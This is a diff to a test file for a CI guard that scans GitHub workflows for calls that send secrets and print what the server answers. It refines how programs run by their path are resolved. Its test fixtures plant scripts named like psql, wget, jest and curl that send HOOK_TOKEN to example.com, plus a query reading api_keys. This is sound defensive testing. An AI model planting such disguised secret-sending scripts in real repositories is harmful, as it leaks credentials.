@@ -26,9 +26,12 @@ import { describe, expect, it } from 'vitest';
  * separators (; && || | & and new lines, outside quotes); a $(...) or
  * backquoted substitution is read as commands too, and env, sudo, timeout,
  * nice and the like (also by a path, /usr/bin/env) are read through. A
- * function called with a secret is read again with its parameters as
- * secrets, wherever the shell got it: from the same script, or from a file
- * that it, or a file it sourced, sourced.
+ * program run by its path (./scripts/psql, tools/wget) is the repository's
+ * file whatever its name, since the shell never looks a word with a '/' up
+ * on PATH: a shell script by its first line is read, any other program is
+ * unresolved. A function called with a secret is read again with its
+ * parameters as secrets, wherever the shell got it: from the same script, or
+ * from a file that it, or a file it sourced, sourced.
  *
  * What the census cannot read is unresolved, and the test fails until each is
  * read by hand and given a reason in READ_BY_HAND: an interpreter (node,
@@ -39,9 +42,10 @@ import { describe, expect, it } from 'vitest';
  * its job's or the workflow's env:) unless it is a local composite one, a run
  * block in another shell, an npm or yarn workspace fan-out, anything past the
  * depth limit, and a program that has a curl command among its arguments (a
- * wrapper WRAPPERS does not list). Any other program (jq, tar, next build, a
- * CLI that pnpm dlx fetches) is taken for what it is: the census does not
- * read it.
+ * wrapper WRAPPERS does not list). A client's name is looked up on PATH, so
+ * a repository file of that name where the step runs is read as well. Any
+ * other program (jq, tar, next build, a CLI that pnpm dlx fetches) is taken
+ * for what it is: the census does not read it.
  *
  * A reason read by hand holds only while what it relies on holds. So each
  * READ_BY_HAND entry also records the secrets in the call's environment (what
@@ -49,8 +53,9 @@ import { describe, expect, it } from 'vitest';
  * step writes to $GITHUB_ENV or $GITHUB_OUTPUT from one), every secret its
  * job uses in any step (the steps share a runner, so one can leave a secret
  * in a file for another), and a hash of each repository file the call runs
- * (the files named on its command line or what `node --test` finds, and what
- * they import from the repository). When any of these changes, the call is
+ * (a repository program run by its path, the files named on its command line
+ * or what `node --test` finds, and what they import from the repository).
+ * When any of these changes, the call is
  * unresolved again until someone reads it again. A call whose files the
  * census cannot list (a whole test suite) records none, so its reason can
  * rest only on its environment and its job.
@@ -1459,7 +1464,13 @@ function dispatch(
   };
   if (expansion(program.raw).expands) return cannot('a program named by an expansion');
   const name = program.value.split('/').pop() ?? '';
-  if (name === 'curl' || name === 'curl.exe') {
+  if (/\.(?:ba|z|k|da)?sh$/.test(program.value)) {
+    runFile(program, args, src, where, text(words), newShell(scope), ctx);
+  } else if (program.value.includes('/') && !program.value.startsWith('/')) {
+    // The shell never looks a word with a '/' up on PATH: ./scripts/psql and
+    // tools/wget are files of the repository, whatever their names.
+    runRepoProgram(program, args, src, where, text(words), newShell(scope), ctx);
+  } else if (name === 'curl' || name === 'curl.exe') {
     const curl = readCurl(args);
     ctx.out.curls.push({
       where,
@@ -1501,14 +1512,22 @@ function dispatch(
     runTurbo(args, src, where, text(words), scope, ctx);
   } else if (RUNNER.test(name)) {
     return cannot(`${name} runs code the census cannot read`, filesRun(name, args, scope, ctx.io));
-  } else if (HTTP_CLIENTS.has(name) || (name === 'gh' && args[0]?.value === 'api')) {
-    return cannot('an HTTP client the census does not judge');
-  } else if (SERVER_CLIENTS.has(name)) {
-    return cannot('a client that prints what a server answers, which the census does not judge');
-  } else if (/\.(?:ba|z|k|da)?sh$/.test(program.value)) {
-    runFile(program, args, src, where, text(words), newShell(scope), ctx);
-  } else if (program.value.includes('/') && !program.value.startsWith('/')) {
-    runRepoProgram(program, args, src, where, text(words), newShell(scope), ctx);
+  } else if (
+    HTTP_CLIENTS.has(name) ||
+    SERVER_CLIENTS.has(name) ||
+    (name === 'gh' && args[0]?.value === 'api')
+  ) {
+    // PATH finds a bare name. A repository file of that name where the step
+    // runs would run instead were its directory on PATH, so it is read too.
+    if (!program.value.includes('/') && findFile(program.value, scope, ctx.io) !== undefined) {
+      runRepoProgram(program, args, src, where, text(words), newShell(scope), ctx);
+    }
+    return cannot(
+      SERVER_CLIENTS.has(name)
+        ? 'a client that prints what a server answers, which the census does not judge'
+        : 'an HTTP client the census does not judge',
+      filesRun(name, [program, ...args], scope, ctx.io),
+    );
   } else if (!PRINTS_ITS_ARGUMENTS.has(name) && runsCurl(args)) {
     // gtimeout 90 curl ..., retry -- curl ...: a wrapper WRAPPERS does not list.
     return cannot(`${name} has a curl command among its arguments, which it may run`);
@@ -1610,14 +1629,17 @@ function runRepoProgram(
 ): void {
   const found = findFile(program.value, scope, ctx.io);
   const body = found === undefined ? null : ctx.io.read(found);
+  const name = program.value.split('/').pop() ?? '';
   if (found === undefined || body === null) {
-    cannotRead(ctx, src, where, call, 'no such file in the repository');
+    // .venv/bin/python x.py: a program an earlier step made; x.py is ours.
+    const runs = filesRun(name, args, scope, ctx.io);
+    cannotRead(ctx, src, where, call, 'no such file in the repository', runs);
   } else if (/^#!\S*?(?:\/env\s+)?\S*\b(?:ba|z|k|da|mk)?sh\b/.test(body)) {
     runFile(program, args, src, where, call, scope, ctx);
   } else {
-    cannotRead(ctx, src, where, call, 'a repository program that is not a shell script', {
-      [found]: fileHash(body),
-    });
+    // The program, what it imports, and the files it is given.
+    const runs = filesRun(name, [program, ...args], scope, ctx.io);
+    cannotRead(ctx, src, where, call, 'a repository program that is not a shell script', runs);
   }
 }
 
@@ -2767,6 +2789,14 @@ interface Plant {
 const NOTIFY_SCRIPT =
   '#!/usr/bin/env bash\ncurl -fsS -H "X-Hook: ${HOOK_TOKEN}" https://example.com/hook\n';
 
+/** A repository program, not a shell script, that sends HOOK_TOKEN and prints the answer. */
+const HOOK_PROGRAM = [
+  '#!/usr/bin/env node',
+  "const answer = await fetch('https://example.com/hook', { headers: { 'X-Hook': process.env.HOOK_TOKEN } });",
+  'console.log(await answer.text());',
+  '',
+].join('\n');
+
 const REPORT_ENV = { REPORT_TOKEN: '${{ secrets.REPORT_TOKEN }}' };
 const HOOK_URL_ENV = { REPORT_HOOK: '${{ secrets.REPORT_HOOK_URL }}' };
 /** A helper file whose function sends its first argument. */
@@ -3864,6 +3894,65 @@ const PLANTS: Plant[] = [
     env: { DATABASE_URL: '${{ secrets.DATABASE_URL }}' },
     finds: { unresolved: /psql "\$DATABASE_URL" .*\(a client that prints what a server answers/ },
   },
+  // (9) Review of a6b05212c: the census took a program by the last part of
+  // its path, so a repository file run by its path and named like a client
+  // or a test runner (./scripts/psql, tools/wget) was taken for that program
+  // and never read. The shell never looks a word with a '/' up on PATH: it is
+  // the file. A bare name is looked up on PATH, so a repository file of a
+  // client's name where the step runs is read as well (E21), and the client
+  // stays unresolved (E22, which holds what the census found before).
+  {
+    id: 'E17',
+    what: 'a repository script named psql, run by its path, sends a secret with curl',
+    script: './scripts/psql',
+    env: HOOK_ENV,
+    files: { 'scripts/psql': NOTIFY_SCRIPT },
+    finds: { violation: /^scripts\/psql:2: curl -fsS -H "X-Hook: \$\{HOOK_TOKEN\}"/ },
+  },
+  {
+    id: 'E18',
+    what: 'a repository program named wget, run by its path, that is not a shell script',
+    script: 'tools/wget --quiet',
+    env: HOOK_ENV,
+    files: { 'tools/wget': HOOK_PROGRAM },
+    finds: {
+      unresolved: /tools\/wget --quiet \(a repository program that is not a shell script\)/,
+    },
+  },
+  {
+    id: 'E19',
+    what: 'a repository script named curl, run by its path, adds the secret itself',
+    script: `./scripts/curl ${API}`,
+    env: HOOK_ENV,
+    files: {
+      'scripts/curl': '#!/usr/bin/env bash\nexec curl -fsS -H "X-Hook: ${HOOK_TOKEN}" "$@"\n',
+    },
+    finds: { violation: /^scripts\/curl:2: exec curl -fsS -H "X-Hook: \$\{HOOK_TOKEN\}"/ },
+  },
+  {
+    id: 'E20',
+    what: 'a repository script named jest, run by its path, sends a secret with curl',
+    script: './scripts/jest --ci',
+    env: HOOK_ENV,
+    files: { 'scripts/jest': NOTIFY_SCRIPT },
+    finds: { violation: /^scripts\/jest:2: curl -fsS -H "X-Hook: \$\{HOOK_TOKEN\}"/ },
+  },
+  {
+    id: 'E21',
+    what: 'psql named bare, beside a repository file psql that sends a secret: PATH may run the file',
+    script: 'psql',
+    env: HOOK_ENV,
+    files: { psql: NOTIFY_SCRIPT },
+    finds: { violation: /^psql:2: curl -fsS -H "X-Hook: \$\{HOOK_TOKEN\}"/ },
+  },
+  {
+    id: 'E22',
+    what: 'psql named bare, beside a harmless repository file psql: the client stays unresolved',
+    script: `psql "$DATABASE_URL" -c 'select id from orders'`,
+    env: { DATABASE_URL: '${{ secrets.DATABASE_URL }}' },
+    files: { psql: '#!/usr/bin/env bash\necho "psql is not installed here"\n' },
+    finds: { unresolved: /psql "\$DATABASE_URL" .*\(a client that prints what a server answers/ },
+  },
 ];
 
 /** A workflow, and the repository files it reads, at one moment. */
@@ -4093,6 +4182,83 @@ const REREADS: Reread[] = [
     opens: /scripts\/helpers\.py changed since it was read/,
   },
   {
+    id: 'F11',
+    what: 'a repository program named wget, run by its path, changes',
+    before: {
+      workflow: reportJob(['        run: tools/wget --quiet']),
+      files: { 'tools/wget': "#!/usr/bin/env node\nconsole.log('report');\n" },
+    },
+    after: {
+      workflow: reportJob(['        run: tools/wget --quiet']),
+      files: { 'tools/wget': HOOK_PROGRAM },
+    },
+    opens: /tools\/wget changed since it was read/,
+  },
+  {
+    id: 'F12',
+    what: 'the file a psql call is given changes',
+    before: {
+      workflow: reportJob(['        run: psql -f db/report.sql']),
+      files: { 'db/report.sql': 'select count(*) from orders;\n' },
+    },
+    after: {
+      workflow: reportJob(['        run: psql -f db/report.sql']),
+      files: { 'db/report.sql': 'select token from api_keys;\n' },
+    },
+    opens: /db\/report\.sql changed since it was read/,
+  },
+  {
+    id: 'F13',
+    what: 'a module that a repository program run by its path imports changes',
+    before: {
+      workflow: reportJob(['        run: ./scripts/report.mjs']),
+      files: {
+        'scripts/report.mjs':
+          "#!/usr/bin/env node\nimport { render } from './render.mjs';\nconsole.log(render());\n",
+        'scripts/render.mjs': "export const render = () => 'report';\n",
+      },
+    },
+    after: {
+      workflow: reportJob(['        run: ./scripts/report.mjs']),
+      files: {
+        'scripts/report.mjs':
+          "#!/usr/bin/env node\nimport { render } from './render.mjs';\nconsole.log(render());\n",
+        'scripts/render.mjs':
+          'export const render = async () => (await fetch(process.env.REPORT_URL)).text();\n',
+      },
+    },
+    opens: /scripts\/render\.mjs changed since it was read/,
+  },
+  {
+    id: 'F14',
+    what: 'the script that a python outside the repository runs changes (.venv/bin/python)',
+    before: {
+      workflow: reportJob(['        run: .venv/bin/python scripts/report.py']),
+      files: { 'scripts/report.py': 'print("report")\n' },
+    },
+    after: {
+      workflow: reportJob(['        run: .venv/bin/python scripts/report.py']),
+      files: {
+        'scripts/report.py':
+          'import os, urllib.request\nprint(urllib.request.urlopen(os.environ["REPORT_URL"]).read())\n',
+      },
+    },
+    opens: /scripts\/report\.py changed since it was read/,
+  },
+  {
+    id: 'F15',
+    what: 'a repository file psql beside a bare psql call changes (PATH may run it)',
+    before: {
+      workflow: reportJob(['        run: psql -c "select 1"']),
+      files: { psql: '#!/usr/bin/env bash\necho "psql is not installed here"\n' },
+    },
+    after: {
+      workflow: reportJob(['        run: psql -c "select 1"']),
+      files: { psql: '#!/usr/bin/env bash\necho "psql is not installed on this runner"\n' },
+    },
+    opens: /: psql -c "select 1" \(a client .*psql changed since it was read/,
+  },
+  {
     id: 'F8',
     what: 'control: nothing it relies on changed (a comment, a step with no secret)',
     before: { workflow: reportJob([REPORT_RUN]), files: REPORT_FILES },
@@ -4280,7 +4446,8 @@ describe('workflows never print the answer of a call that sends a secret', () =>
   // PR lists what it found for each. The third review (2026-10-31, of
   // e43f2c33a) added (6) and (7), and checking the guard that answered it
   // added (8): the guard of e43f2c33a missed each of those too, but the
-  // controls D13, E4 and D20.
+  // controls D13, E4 and D20. The review of a6b05212c added (9): the guard
+  // of a6b05212c missed each of those but E22.
   describe('one plant per gap the second review found', () => {
     it.each(PLANTS)('$id: $what', (p) => {
       const files = p.files ?? {};
@@ -4311,7 +4478,9 @@ describe('workflows never print the answer of a call that sends a secret', () =>
   // Review finding 4 (2026-10-31, of e43f2c33a): a reason read by hand stayed
   // accepted after a secret was mapped into the step it read, or after the
   // program it read changed. Each plant reads `before` by hand, then changes
-  // it; the guard of e43f2c33a opened none of them.
+  // it; the guard of e43f2c33a opened none of them. The review of a6b05212c
+  // added F11 to F15: that guard opened none of them but F14, which holds
+  // what it found for a program an earlier step made.
   describe('a reason read by hand holds only while what it relies on holds', () => {
     it.each(REREADS)('$id: $what', (p) => {
       const read = readAsItIs(censusAt(p.before));
